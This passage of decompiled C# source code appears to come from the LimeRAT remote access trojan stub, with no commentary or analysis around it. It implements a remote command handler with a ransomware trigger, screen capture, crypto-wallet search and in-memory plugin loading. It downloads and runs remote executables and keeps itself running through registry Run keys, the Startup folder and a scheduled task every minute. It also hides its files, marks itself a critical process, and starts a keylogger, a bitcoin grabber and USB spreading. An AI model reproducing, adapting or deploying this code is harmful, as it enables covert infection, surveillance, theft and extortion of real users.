					if (File.Exists(folderPath + "\\Microsoft\\MMC\\hash"))
					{
						Send("MSG" + Y + "Ransomware: The client is already encrypted");
						return;
					}
					Rware rware = new Rware();
					rware.GenKey();
					break;
				}
				case "pcspecs":
					Send("MSG" + Y + "CPU: " + GetCPU() + " || GPU: " + GetVideoCard() + " || RAM: " + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1024.0 / 1024.0 / 1024.0), "###,###,##0 GB"));
					break;
				case "prof":
					switch (array[1])
					{
					case "@":
						DLV(array[2]);
						break;
					case "!":
						STV(array[2], array[3], RegistryValueKind.String);
						Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + Y + array[1] + Y), RuntimeHelpers.GetObjectValue(GTV(array[1], ""))))));
						break;
					case "~":
						STV(array[2], array[3], RegistryValueKind.String);
						break;
					}
					return;
				case "ShowBar":
					try
					{
						string lpClassName = "Shell_traywnd";
						string lpWindowName = "";
						int hwnd = FindWindowA(ref lpClassName, ref lpWindowName);
						SetWindowPos(hwnd, 0, 0, 0, 0, 0, 64);
						Send("MSG" + Y + "Showbar");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "BlockWebpage":
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1  " + array[1], true);
						Send("MSG" + Y + "Webpage " + array[1] + " Blocked successfully!");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						Send("MSG" + Y + "Block Webpage: Lime's Stub is not running as administrator");
						ProjectData.ClearProjectError();
					}
					break;
				case "antiproc":
					MyAntiProcess.Start();
					Interaction.SaveSetting("Lime", "SU", "anti", "1");
					Send("MSG" + Y + "Anti Process started!");
					break;
				case "searchwallet":
					Send(("MSG" + Y + "Installed Wallet: " + GetWallet()) ?? "");
					break;
				}
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "un":
						switch (array[1])
						{
						case "@":
							pr(0);
							Process.Start(LO.FullName);
							ProjectData.EndApp();
							break;
						case "!":
							pr(0);
							ProjectData.EndApp();
							break;
						case "~":
							UNS();
							break;
						}
						return;
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val2 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val3 = Graphics.FromImage((Image)(object)val2);
						Size size = new Size(((Image)val2).get_Width(), ((Image)val2).get_Height());
						val3.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							size = new Size(32, 32);
							bounds = new Rectangle(Cursor.get_Position(), size);
							Cursors.get_Default().Draw(val3, bounds);
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception projectError22 = ex7;
							ProjectData.SetProjectError(projectError22);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						val3.Dispose();
						Bitmap val4 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val3 = Graphics.FromImage((Image)(object)val4);
						val3.DrawImage((Image)(object)val2, 0, 0, ((Image)val4).get_Width(), ((Image)val4).get_Height());
						val3.Dispose();
						MemoryStream memoryStream5 = new MemoryStream();
						string S = "CAP" + Y;
						b = SB(ref S);
						memoryStream5.Write(b, 0, b.Length);
						MemoryStream memoryStream6 = new MemoryStream();
						((Image)val4).Save((Stream)memoryStream6, ImageFormat.get_Jpeg());
						string text6 = md5(memoryStream6.ToArray());
						if (Operators.CompareString(text6, lastcap, false) != 0)
						{
							lastcap = text6;
							memoryStream5.Write(memoryStream6.ToArray(), 0, (int)memoryStream6.Length);
						}
						else
						{
							memoryStream5.WriteByte(0);
						}
						Sendb(memoryStream5.ToArray());
						memoryStream5.Dispose();
						memoryStream6.Dispose();
						((Image)val2).Dispose();
						((Image)val4).Dispose();
						return;
					}
					case "ret":
					{
						byte[] array13 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array13.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + Y + array[1] + Y).Length;
							memoryStream7.Write(b, length5, b.Length - length5);
							array13 = ZIP(memoryStream7.ToArray());
							STV(array[1], array13, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue4 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array13, "A")));
						string[] obj2 = new string[5]
						{
							"ret",
							Y,
							array[1],
							Y,
							null
						};
						string S = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue4), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
						obj2[4] = ENB(ref S);
						Send(string.Concat(obj2));
						return;
					}
					case "inv":
					{
						byte[] array12 = (byte[])GTV(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array12.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length4 = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
							memoryStream4.Write(b, length4, b.Length - length4);
							array12 = ZIP(memoryStream4.ToArray());
							STV(array[1], array12, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array12, "A")));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!Cn), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					}
					if (Operators.CompareString(text, "up", false) != 0)
					{
						if (Operators.CompareString(text, "Ex", false) == 0)
						{
							if (PLG == null)
							{
								Send("PLG");
								int num2 = 0;
								while (!(unchecked(PLG != null || num2 == 20) | !Cn))
								{
									num2++;
									Thread.Sleep(1000);
								}
								if ((PLG == null) | !Cn)
								{
									return;
								}
							}
							object[] array14 = new object[1] { b };
							bool[] array15 = new bool[1] { true };
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "ind", array14, (string[])null, (Type[])null, array15, true);
							if (array15[0])
							{
								b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array14[0])), typeof(byte[]));
							}
						}
						else if (Operators.CompareString(text, "PLG", false) == 0)
						{
							MemoryStream memoryStream8 = new MemoryStream();
							int length6 = (array[0] + Y).Length;
							memoryStream8.Write(b, length6, b.Length - length6);
							PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream8.ToArray()), "A")));
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
						}
						return;
					}
					byte[] array16 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream9 = new MemoryStream();
							int length7 = (array[0] + Y).Length;
							memoryStream9.Write(b, length7, b.Length - length7);
							array16 = ZIP(memoryStream9.ToArray());
						}
						catch (Exception ex8)
						{
							ProjectData.SetProjectError(ex8);
							Exception projectError23 = ex8;
							ProjectData.SetProjectError(projectError23);
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array16 = webClient.DownloadData(array[1]);
						}
						catch (Exception ex9)
						{
							ProjectData.SetProjectError(ex9);
							Exception projectError24 = ex9;
							ProjectData.SetProjectError(projectError24);
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					Send("bla");
					string text7 = Path.GetTempFileName() + ".exe";
					try
					{
						Send("MSG" + Y + "Updating To " + new FileInfo(text7).get_Name());
						Thread.Sleep(2000);
						File.WriteAllBytes(text7, array16);
						Process.Start(text7, "..");
					}
					catch (Exception ex10)
					{
						ProjectData.SetProjectError(ex10);
						Exception ex11 = ex10;
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						Send("MSG" + Y + "Update ERROR " + ex12.Message);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
					UNS();
					return;
				}
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream10 = new MemoryStream();
						int length8 = (array[0] + Y + array[1] + Y).Length;
						memoryStream10.Write(b, length8, b.Length - length8);
						bytes = ZIP(memoryStream10.ToArray());
					}
					catch (Exception ex13)
					{
						ProjectData.SetProjectError(ex13);
						Exception projectError25 = ex13;
						ProjectData.SetProjectError(projectError25);
						Send("MSG" + Y + "Execute ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				else
				{
					WebClient webClient2 = new WebClient();
					try
					{
						bytes = webClient2.DownloadData(array[2]);
					}
					catch (Exception ex14)
					{
						ProjectData.SetProjectError(ex14);
						Exception projectError26 = ex14;
						ProjectData.SetProjectError(projectError26);
						Send("MSG" + Y + "Download ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				Send("bla");
				string text8 = Path.GetTempFileName() + "." + array[1];
				try
				{
					File.WriteAllBytes(text8, bytes);
					Process.Start(text8);
					Send("MSG" + Y + "Executed As " + new FileInfo(text8).get_Name());
				}
				catch (Exception ex15)
				{
					ProjectData.SetProjectError(ex15);
					Exception ex16 = ex15;
					ProjectData.SetProjectError(ex16);
					Exception ex17 = ex16;
					Send("MSG" + Y + "Execute ERROR " + ex17.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex18)
			{
				ProjectData.SetProjectError(ex18);
				Exception ex19 = ex18;
				ProjectData.SetProjectError(ex19);
				Exception ex20 = ex19;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex20.Message);
				}
				catch (Exception ex21)
				{
					ProjectData.SetProjectError(ex21);
					Exception projectError27 = ex21;
					ProjectData.SetProjectError(projectError27);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
				string s = DEB(ref s2) + "_" + HWD();
				text = text3 + ENB(ref s) + Y;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s = HWD();
			text = text4 + ENB(ref s) + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError5 = ex5;
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError6 = ex6;
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception projectError7 = ex7;
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + GETav() + Y + ".." + Y + ACT() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8);
			Exception projectError8 = ex8;
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void INS()
	{
		Thread.Sleep(1000);
		if (Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(DR) + "\\" + EXE, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(LO.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				LO = new FileInfo(Interaction.Environ(DR) + "\\" + EXE);
				Process.Start(LO.FullName);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean((object)HIDE_ME))
		{
			File.SetAttributes(Interaction.Environ(DR) + "\\" + EXE, FileAttributes.Hidden);
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		if (Isu)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception projectError4 = ex4;
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (IsF)
		{
			try
			{
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG, overwrite: true);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean((object)HIDE_ME))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)0);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void eroc()
	{
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_026b: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			Thread.Sleep((int)Math.Round(Math.Round(Math.Round(Conversions.ToDouble(SLP) * 1000.0))));
			try
			{
				string setting = Interaction.GetSetting("Lime", "SU", "anti", "");
				if (setting.EndsWith("1"))
				{
					MyAntiProcess.Start();
				}
				else if (setting.EndsWith("0"))
				{
					Anti_CH = false;
				}
				else if (Anti_CH)
				{
					MyAntiProcess.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string setting2 = Interaction.GetSetting("Lime", "SU", "btc", "");
				if (setting2.EndsWith("1"))
				{
					bitgrb.Start();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (BOT_KILL)
			{
				try
				{
					BotKillers.RunStandardBotKiller();
					Thread.Sleep(50);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (USB_SP)
			{
				SPUSB.Enable();
			}
			if (Persis)
			{
				try
				{
					object executablePath = Application.get_ExecutablePath();
					Interaction.Shell("schtasks /Delete /tn NYAN /F", (AppWinStyle)0, false, -1);
					Thread.Sleep(100);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /tn NYAN /tr \"", executablePath), (object)"\" /sc minute /mo 1")), (AppWinStyle)0, false, -1);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (Interaction.Command() != null)
			{
				try
				{
					((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError5 = ex;
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool createdNew = false;
			MT = new Mutex(initiallyOwned: true, RG, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			INS();
			if (!Idr)
			{
				EXE = LO.get_Name();
				DR = LO.Directory!.get_Name();
			}
			Thread thread = new Thread(RC, 1);
			thread.Start();
			try
			{
				kq = new kl();
				Thread thread2 = new Thread(kq.WRK, 1);
				thread2.Start();
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError6 = ex2;
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			int num = 0;
			string text = "";
			if (BD)
			{
				try
				{
					SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
					{
						ED();
					});
					pr(1);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception projectError7 = ex3;
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat"))
				{
					LimeSL limeSL = new LimeSL();
					((Form)limeSL).ShowDialog();
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				Thread.Sleep(1000);
				if (!Cn)
				{
					text = "";
				}
				Application.DoEvents();
				try
				{
					num++;
					if (num == 5)
					{
						try
						{
							Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4);
							Exception projectError9 = ex4;
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					if (num >= 8)
					{
						num = 0;
						string text2 = ACT();
						if (Operators.CompareString(text, text2, false) != 0)
						{
							text = text2;
							Send("act" + Y + text2);
						}
					}
					if (!Isu)
					{
						continue;
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
						{
							((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception projectError10 = ex5;
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_LocalMachine().GetValue(sf + "\\" + RG, "")), (object)("\"" + LO.FullName + "\" .."), false))
						{
							((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6);
						Exception projectError11 = ex6;
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception projectError12 = ex7;
					ProjectData.SetProjectError(projectError12);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static string md5(byte[] B)
	{
		B = new MD5CryptoServiceProvider().ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (C != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0276:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (C.Available < 1)
							{
								C.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (C.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = C.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (C.Available > 0)
											{
												goto IL_0170;
											}
											goto IL_0276;
										case -1:
											goto end_IL_010e;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_010e:
										break;
									}
									break;
								}
								b = new byte[C.Available + 1 - 1 + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
								}
								int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(delegate(object a0)
									{
										Ind((byte[])a0);
									}, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_0276;
								IL_0170:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			FileInfo lO = LO;
			lock (lO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (Cn)
				{
					Cn = false;
					C.Close();
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError2 = ex2;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t)), typ);
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void UNS()
	{
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				if (File.Exists(programFiles + RG))
				{
					File.Delete(programFiles + RG);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		pr(0);
		Isu = false;
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
